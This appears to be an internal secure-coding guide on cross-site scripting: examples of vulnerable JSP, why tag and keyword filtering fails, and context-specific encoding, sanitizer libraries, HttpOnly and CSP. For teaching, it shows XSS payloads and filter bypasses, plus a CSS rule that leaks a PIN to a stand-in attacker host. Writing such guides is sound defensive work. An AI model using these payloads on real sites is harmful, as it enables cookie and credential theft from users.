# Cross Site Scripting (XSS)

Data (from untrusted source) gets into the application, then this data is later displayed in the website without being _properly_ validated/sanitized/escaped.

## Example

```jsp
<%-- search.jsp --%>
<% String searchParam = request.getParameter("searchParam"); %>
<h2>Search results for <%= searchParam %></h2>
```

Imagine calling it via `http://whatever/search.jsp?searchParam=<script>alert(document.cookies)</script>`

**What to do?**

- *Remove the `<script>` tags!* - `<scrIpt>` works as well

- Use regexp like `/[sS][cC][rR][iI][pP][tT]/` - `<img src=javascript:alert(1)>`

- *remove `javascript:`* - `<img src=jav&#x41;script:alert(1)>`
- *HTML decode, THEN remove* - `<img src=nonexistent onerror=alert(1)>`

... far from easy.

## Prevention

### NEVER insert untrusted data

In a script:

`<script>... NOT HERE...</script>`

Inside a HTML comment:

`<!-- ... NOT HERE ... -->`

As a tag or attribute name:

`<NOTHERE></NOTHERE>`
`<div NOTHERE=something></div>`

Directly into CSS:

`<style>... NOT HERE ...</style>`

These places are almost impossible to escape/sanitize properly. Do not even try.

### ... exceptions

Since sometimes we definitely need data that is coming from untrusted source.

#### HTML context

HTML encode before inserting something into HTML element context

```html
<div>
  ... HTMLENCODED UNTRUSTED DATA HERE ...
</div>
```

It might be sufficient to encode the following characters, to prevent switching into other execution contexts:

- `&` => `&amp;`
- `<` => `&lt;`
- `>` => `&gt;`
- `"` => `&quot;`
- `'` => `&#x27;`

#### HTML Attribute context

```html
<div attr="... ATTRIBUTE ENCODED UNTRUSTED DATA HERE ...">content</div>
```

- Always quote attributes with `"` or `'`. Quoted attributes can be broken only by the corresponding quote, not quoted attributes can be broken out in may ways (with `[space]`, `/`, `|`, ...)
- Encode the corresponding quote in the data
  - `"` => `&#x22;`
  - `'` => `&#x27;`
- Some attributes are capable of executing their content, they should **never** include untrusted data:
  - `href` - `href="javascript:alert(1)"`
  - all event handlers (`onclick`, `onerror`, `onload`, ...)
  - `src` - obviously
  - `style` - CSS context, dangerous

#### JavaScript data

Do not insert untrusted data into JavaScript context.

**BAD** example (from FD):

```jsp
<script>
  window.browseData = <fd:ToJSON value="${browsePotato}"/>; // well, it's not even JSON...
</script>
```

In this example, `browsePotato` contains some URL parameters, like `searchParam`, `grpId`, etc.

This is a proper JS object: `{ searchParam: "</script><script>alert(1)</script>" }`, and is completely OK in a JS file. But in an HTML, the HTML parser breaks the `<script>` tag at the first `</script>`...

Instead, put the HTML escaped JSON (really) data inside of an HTML tag, then read it via JS, and decode it:

```jsp
<script type="application/json-htmlencoded" id="browsePotato">
  <fd:ToEscapedJSON value="${browsePotato}" />
</script>
<script>
  const dataEl = document.getElementById("browsePotato");
  window.browseData = JSON.parse(dataEl.textContent); // `textContent` is unescaped
</script>
```

#### CSS

Do not insert data into CSS context. It's hard to be safe. Use CSS variables, that can be set via JS.

```CSS
/* obvious */
.whatever {
  background-url: "javascript:alert(1)";
}

/* not that obvious */
input.pincode[value="1234"] {
  background: url(https://h4x0r.org/log?pin=1234);
}

/* ... */
```

#### URL parameters

URLencode everything that goes into URL parameter.

```jsp
<a href="/search.jsp?page=2&searchParam=<%= URLENCODE_THIS %>">Search page 2</a>
```

(It's basically attribute context, but easier to handle.)

#### Need to output untrusted HTML

Use a well maintained sanitizer library, update it regularly.

Examples:

- Java - OWASP Java HTML Sanitizer
- JS - DOMPurify

Don't try to write your own sanitizer, you'll fail.

### Extra protection

- use `HTTPOnly` option for cookies that are not needed by JS
  - https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies
- use proper `CSP` header, it can prevent XSS by disabling inline JavaScripts
  - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
